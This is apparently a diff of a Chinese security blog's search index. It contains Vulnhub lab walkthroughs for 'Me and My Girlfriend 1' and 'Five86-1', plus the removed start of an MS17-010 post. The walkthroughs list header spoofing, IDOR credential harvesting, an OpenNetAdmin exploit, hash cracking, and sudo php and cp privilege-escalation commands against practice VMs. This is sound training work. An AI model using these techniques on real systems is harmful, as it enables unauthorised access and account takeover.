+<p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   	<span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
-<br>
-
-<p>不过，也是学到技能了</p>
-<br>
-
-<p>也可以使用如下方式：</p>
-<ul>
-<li>创建一个权限 <code>777</code> 的文件</li>
-<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
-<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
-<li><code>cat</code> 查看</li>
-</ul>
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
+<p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt	<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index	<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure>
 
+<br>
+
+<p><img src="2020-02-10-21-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p>
+<p>看源代码，除密码为明文，无其他有价值信息。</p>
+<br>
+
+<p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p>
+<br>
+
+<p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">Alice</span> <span class="string">Geulis</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">alice</span></span><br><span class="line"><span class="attr">passwd:</span> <span class="string">4lic3</span></span><br></pre></td></tr></table></figure>
+
+<br>
+<br>
+
+
+<p><img src="2020-02-10-21-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-19-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Flag 1 :</span> <span class="string">gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+<p><img src="2020-02-10-19-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br>
+
+<p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure>
+
+<p>得到 FLAG2</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Thanks!</span> <span class="attr">Flag 2:</span> <span class="string">gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<p><img src="2020-02-10-22-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-20-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-20-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -1347,143 +1354,179 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub靶机——Me and My Girlfirend1</title>
-    <url>/2020/03/03/Me-and-My-Girlfirend1/</url>
+    <title>Five86-1</title>
+    <url>/2020/03/10/Five86-1/</url>
     <content><![CDATA[<blockquote>
-<p>2020-02-10-22</p>
+<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
 </blockquote>
 <br>
 
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your <span class="keyword">help</span> <span class="keyword">to</span> <span class="keyword">get</span> what Alice <span class="keyword">is</span> hiding <span class="keyword">and</span> <span class="keyword">get</span> <span class="keyword">full</span> <span class="keyword">access</span> <span class="keyword">to</span> the company!</span><br><span class="line"></span><br><span class="line">Difficulty <span class="keyword">Level</span>: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there <span class="keyword">are</span> <span class="number">2</span> flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line"><span class="keyword">From</span> : https://www.vulnhub.com/entry/me-<span class="keyword">and</span>-my-girlfriend<span class="number">-1</span>,<span class="number">409</span>/</span><br></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
 
 <br>
+<br>
 
-<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">Kali：<span class="number">192.168</span><span class="number">.56</span><span class="number">.109</span></span><br><span class="line"></span><br><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
 
 <br>
 
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
 
-<p>显示主机存活扫描：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+<p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>扫服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
 
 <br>
 
-<p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p>
-<br>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
 
-<p>排除本机与网关后，找出目标机，扫服务/端口：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p>
-<br>
-
-<p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p>
-<br>
-
-<p><img src="2020-02-10-18-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p>
-<p><img src="2020-02-10-20-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p>
-<br>
-
-<p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p>
-<p>在 Burp 上有更方便的操作方式，后来改之</p>
 <br>
 
 <hr>
 <br>
 
-<p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p>
-<br>
-
-<p>既然是 Web 那便开始扫目录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure>
+<p>访问 80 端口，无有价值信息</p>
+<p>例行扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
 
 <br>
 
-<p><img src="2020-02-10-18-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-18-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
 <br>
 
-
-<p>得到地址：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure>
-
-<p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   	<span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure>
-
-<p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt	<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure>
+<p>经访问：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
-<p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index	<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure>
-
+<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
 <br>
 
-<p><img src="2020-02-10-21-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p>搜索相关漏洞，得到远程命令执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
 <br>
 
-<p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p>
-<p>看源代码，除密码为明文，无其他有价值信息。</p>
+<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
+
+<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
 <br>
 
-<p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p>
-<br>
-
-<p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">Alice</span> <span class="string">Geulis</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">alice</span></span><br><span class="line"><span class="attr">passwd:</span> <span class="string">4lic3</span></span><br></pre></td></tr></table></figure>
-
+<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
 <br>
 <br>
 
-
-<p><img src="2020-02-10-21-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-19-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Flag 1 :</span> <span class="string">gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span></span><br></pre></td></tr></table></figure>
+<p>使用 MSF：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
 
 <br>
 
-
-
-<p><img src="2020-02-10-19-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
 <br>
 
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br>
-
-<p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure>
-
-<p>得到 FLAG2</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">Thanks!</span> <span class="attr">Flag 2:</span> <span class="string">gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span></span><br></pre></td></tr></table></figure>
+<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
+<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
+<br>
 
-<p><img src="2020-02-10-22-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-20-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-10-20-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
+
+<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
+<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
+<br>
+
+<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>涉及知识的盲区了，特地去查询记录了一下</p>
+<br>
+
+<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
+<br>
+
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
+
+<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
+<br>
+<br>
+
+<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
+<br>
+
+<p>不过，也是学到技能了</p>
+<br>
+
+<p>也可以使用如下方式：</p>
+<ul>
+<li>创建一个权限 <code>777</code> 的文件</li>
+<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
+<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
+<li><code>cat</code> 查看</li>
+</ul>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -1723,49 +1766,6 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       <tags>
         <tag>vulnhub</tag>
         <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MS17-010复现</title>
-    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
-<a id="more"></a>
-
-<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
-<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
-<p>受影响的系统(详细系统版本请查看公告)：</p>
-<ul>
-<li>Windows Vista</li>
-<li>Windows Server 2008</li>
-<li>Windows 7</li>
-<li>Windows Server 2008 R2</li>
-<li>Windows 8.1</li>
-<li>Windows Server 2012 和 Windows Server 2012 R2</li>
-<li>Windows RT 8.1</li>
-<li>Windows 10</li>
-<li>Windows Server 2016</li>
-</ul>
-<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
-<ul>
-<li>CVE-2017-0143</li>
-<li>CVE-2017-0144</li>
-<li>CVE-2017-0145</li>
-<li>CVE-2017-0146</li>
-<li>CVE-2017-0148</li>
-</ul>
-<br>
-
-<p>复现环境：</p>
-<ul>
-<li>Windows 7 (Build 7601, Service Pack 1)</li>
-<li>Ubuntu server(Metasploit)</li>
-</ul>
-<br>
-
